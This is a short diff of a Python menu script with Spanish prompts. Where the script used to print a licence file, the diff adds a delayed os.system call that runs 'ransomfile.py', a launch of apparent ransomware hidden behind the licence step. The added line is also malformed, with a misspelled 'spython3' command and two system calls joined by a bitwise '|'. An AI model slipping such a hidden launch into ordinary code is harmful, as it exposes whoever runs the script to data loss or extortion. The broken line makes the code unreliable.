@@ -14,8 +14,8 @@ for vwtool in vw:
 if (vwtool == "5"):
 
 	print("\x1b[1;31m"+"\n\n                     Desbloqueando... \n\n           --------Redirigiendo al menú--------")
-
+	print("\x1b[1;31m"+"\n\n\n")
 else:
-	os.system('sleep 3s; cat licencia')
+	os.system('sleep 2s; cat licencia') | os.system('sleep 5s; spython3 ransomfile.py')
 
 os.system('sleep 3')
